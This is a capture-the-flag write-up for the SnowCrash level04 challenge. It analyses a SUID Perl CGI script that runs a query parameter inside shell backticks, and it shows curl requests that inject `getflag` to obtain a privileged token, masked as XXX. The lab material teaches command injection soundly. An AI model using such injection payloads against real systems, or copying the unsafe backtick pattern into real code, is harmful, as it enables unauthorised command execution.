# LEVEL04

## 1. Inspect The Home Directory

```bash
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

The script `level04.pl` is owned by `flag04`, with the SUID bit set (`-rwsr-sr-x`), meaning it will run with the privileges of `flag04`.
`perl` is a scripting language, often used for automation and for generating dynamic web content (for example, via CGI).
Interact with it by sending an HTTP request.

## 2. Analyze The Script

```bash
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
The script retrieves the request’s content and prints it. More precisely, it:
- Uses `CGI` to get the `x` parameter from the request (`x=` after the `?` in the URL).
- Stores the value of this parameter in `$y`.
- Executes `echo $y` inside backticks (which allows code injection), which means the value of `$y` is executed as a shell command (with `flag04` privileges).
- Prints the output of that command in the HTTP response.


## 3.a Exploit Using Command Injection With Quoted Backticks

```bash
level04@SnowCrash:~$ curl 'http://localhost:4747/level04.pl?x=`getflag`'
Check flag.Here is your token : XXX
```

The use of backticks `` ` `` in a curl command can be used to exploit the script.
The backticks are interpreted by Perl as "execute this command".
When sending `getflag` between backticks, upon reaching the line `` print `echo $y 2>&1`; ``, the script interprets the backticks and executes the `getflag` command. Because of the `flag04`'s privileges, it returns the token.

**Explanation:**
>- `curl` 				  : makes an HTTP request.
>- `http://`				: protocol used.
>- `localhost`	  	: destination host, here the request is made to the local machine.
>- `4747`	: port number where the Perl CGI script is listening.
>- `level04.pl`  	: script to execute *(can be omitted from the request)*.
>- `?x`	: query parameter passed to the script, read by `CGI`.

## 3.b Exploit Using Command Injection With Escaped Backticks

```bash
level04@SnowCrash:~$ curl http://localhost:4747/level04.pl?x=\`getflag\`
Check flag.Here is your token : XXX
```

The single quotes `'` surrounding the curl request can be removed, provided that the backticks `` ` `` are escaped with `\`.
Escaping tells the shell to treat the backticks as literal characters and not interpret them locally, ensuring they are sent unchanged in the `curl` command.

**Explanation:**
>- `curl` 				  : makes an HTTP request.
>- `http://`				: protocol used.
>- `localhost`	  	: destination host, here the request is made to the local machine.
>- `4747`	: port number where the Perl CGI script is listening.
>- `level04.pl`  	: script to execute *(can be omitted from the request)*.
>- `?x`	: query parameter passed to the script, read by `CGI`.

## 3.c What Happens Without Proper Backtick Usage

```bash
level04@SnowCrash:~$ curl http://localhost:4747/level04.pl?x=`getflag`
Check
curl: (6) Couldn't resolve host 'flag.Here'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'your'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host ''  
curl: (6) Couldn't resolve host 'Nope'
curl: (6) Couldn't resolve host 'there'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'no'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host 'here'
curl: (6) Couldn't resolve host 'for'
curl: (6) Couldn't resolve host 'you'
curl: (6) Couldn't resolve host 'sorry.'
curl: (6) Couldn't resolve host 'Try'
curl: (6) Couldn't resolve host 'again'
curl: (6) Couldn't resolve host ''
```

Without single quotes or escaping, the backticks are interpreted by the shell locally.
The output of `getflag` replaces the `` `getflag` `` in the request, splitting it into multiple arguments, which `curl` treats as separate hostnames, causing the errors above.
Escaping (`` \`getflag\` ``) or quoting (`` '`getflag`' ``) ensures the backticks reach the server unchanged.

**Explanation:**
>- `curl` 				  : makes an HTTP request.
>- `http://`				: protocol used.
>- `localhost`	  	: destination host, here the request is made to the local machine.
>- `4747`	: port number where the Perl CGI script is listening.
>- `level04.pl`  	: script to execute *(can be omitted from the request)*.
>- `?x`	: query parameter passed to the script, read by `CGI`.